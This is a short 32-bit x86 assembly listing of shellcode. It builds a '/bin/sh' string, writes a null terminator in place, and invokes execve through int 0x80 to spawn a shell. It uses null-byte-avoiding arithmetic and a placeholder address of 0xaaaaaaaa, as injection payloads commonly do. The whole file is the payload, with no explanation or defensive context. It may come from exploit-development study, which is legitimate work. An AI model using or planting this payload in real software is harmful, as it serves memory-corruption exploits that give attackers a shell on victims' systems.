; section .data
; msg db '/bin/shx'
section .text
global _start
_start:
  xor edx, edx
  inc edx
  inc edx
  inc edx
  inc edx
  sub esp, edx
  xor eax, eax
  mov [esp], eax

  mov ebx, 0xaaaaaaaa
  add ebx, edx
  add ebx, edx
  dec ebx
  mov byte [ebx], al
  inc ebx
  sub ebx, edx
  sub ebx, edx

  sub esp, edx
  mov dword [esp], ebx
  mov ecx, esp
  xor edx, edx
  mov al, 0xb
  int 0x80
